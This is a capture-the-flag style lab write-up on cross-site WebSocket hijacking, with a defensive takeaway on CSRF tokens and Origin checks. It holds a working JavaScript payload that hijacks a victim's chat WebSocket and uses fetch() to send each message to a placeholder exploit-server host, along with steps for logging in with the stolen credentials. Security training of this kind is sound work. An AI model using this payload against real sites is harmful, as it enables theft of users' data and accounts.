# Lab 3: Cross-site WebSocket hijacking (CSWSH)

**Difficulty:** Practitioner

## Goal

Exfiltrate the victim's chat history over a hijacked WebSocket, read the credentials it contains, and log in as the victim. This is CSRF on the WebSocket handshake.

## Exploit

Host on the exploit server:

```html
<script>
  var ws = new WebSocket('wss://LAB-ID.web-security-academy.net/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://YOUR-EXPLOIT-SERVER.exploit-server.net/exfil?d=' + encodeURIComponent(event.data));
  };
</script>
```

## Steps

1. Confirm that sending `READY` in the chat replays past messages, and the handshake has no CSRF token or Origin check
2. Host the exploit; on load it opens a WebSocket to the chat, sends READY, and exfiltrates each replayed message to the exploit server access log
3. View exploit on yourself and confirm your own chat history appears in the access log as `/exfil?d=...`
4. Deliver to the victim, then read the access log for the message containing the victim's credentials
5. Log in as the victim (found: carlos / a password disclosed in the chat)

## Why it works

The handshake is authenticated only by the session cookie and has no CSRF defence. Because the browser sends cookies automatically and there is no Origin check, an attacker page can establish an authenticated WebSocket from the victim's browser. WebSockets are bidirectional, so the attacker can send READY and read the responses - turning a CSRF into full data exfiltration.

## Note on the exfil

The `fetch` is cross-origin, so the browser blocks reading its response, but the request still reaches the exploit server and is logged. Reading the response is not needed - the URL with the data in the query string is what matters.

## Takeaway

WebSocket handshakes need the same CSRF protections as any state-changing HTTP request: a CSRF token and strict Origin validation. Without them, cookie-authenticated WebSockets are hijackable, and because the channel is bidirectional, the impact is data theft, not just blind action forgery. This is the exact technique behind the CSRF SameSite Strict sibling-domain lab.

## Note on automation

Delivered from the exploit server and driven by the victim's browser. No Python solve; the exploit script above is the payload.
